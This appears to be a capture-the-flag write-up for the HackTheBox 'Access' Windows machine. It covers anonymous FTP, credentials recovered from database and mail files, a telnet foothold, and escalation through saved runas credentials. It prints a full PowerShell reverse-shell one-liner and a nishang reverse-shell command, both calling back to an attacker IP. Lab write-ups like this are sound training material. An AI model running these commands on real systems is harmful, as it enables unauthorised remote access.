---
title: HTB [Access]
date: 2023-02-19 01:28:05 +0200
categories: [windows,ACL]
tags: [HACKTHEBOX MACHINES]
excerpt: Access is an easy hackthebox machine that involves anonymous ftp login to download files and there are some creds outlook file, we can use that to get shell via telnet. For root we use the saved cred to run commands as Administrator using runas
---

![](https://i.imgur.com/Imw3pWQ.png)

## RECON

```js
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst:
|_  SYST: Windows_NT
23/tcp open  telnet  syn-ack Microsoft Windows XP telnetd
| telnet-ntlm-info:
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
```

<br>

- It's a windows machine and three ports opened
- Anonymous login is allowed in FTP

![](https://i.imgur.com/2eL5d9M.png)

- There's a single file in each directory
- Download that first
- 'Access Control.zip' and  `backup.mdb`
- `backup.mdb` is `Microsoft Access Database`
- The zip file is protected by password

![](https://i.imgur.com/digFFvL.png)

- So let's use `mdb` tools to see is there any password stored in `backup.mdb` file!
- There's a table called `auth_user`

![](https://i.imgur.com/BMgmf2g.png)

- Using the password `access4u@security` to extract `Access Control.zip` gives a file named `Access Control.pst` 

![](https://i.imgur.com/0Y9OWl0.png)

- Extract it

![](https://i.imgur.com/ltAzr84.png)

- We got some creds `security:4Cc3ssC0ntr0ller`

## INITIAL FOOTHOLD

![](https://i.imgur.com/bsXoSUo.png)

- Use this creds in telnet to login, there we can execute commands
- This shell is superslow and we can't able to delete letters
- So I'm gonna use a powershell  oneliner to get a rev shell to my machine

<br>

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.16.10',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

<br>

![](https://i.imgur.com/ux1oaLm.png)


## PRIVESC 

![](https://i.imgur.com/U50azsI.png)

- This file seems interesting, it's a shortcut file for `ZKAccess 3.5 Security System software`
- It's a security management software that provides various features such as access control, time and attendance management, and alarm monitoring

![](https://i.imgur.com/z3LJ1IU.png)

- They're using `runas.exe`
- Note `user:ACCESS\Administrator /savecred `

> The /savecred parameter in the runas command in Windows allows the user to save the credentials used for the specified command

![](https://i.imgur.com/TxgQROg.png)

- We can use `cmdkey` to list the saved credentials, so they saved credentials for Administrator here
- Now we can use runas command to run commands as `Administrator` using this `/savecred` parameter
- The above payload which we used to get not worked, so I'm gonna use `nishang/Shells/Invoke-PowerShellTcp.ps1`
- You can download this in github
- Add `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.10 -Port 1337` to the end of the powershell script and start a python server

![](https://i.imgur.com/3xG3Pzm.png)

- And we got the shell!!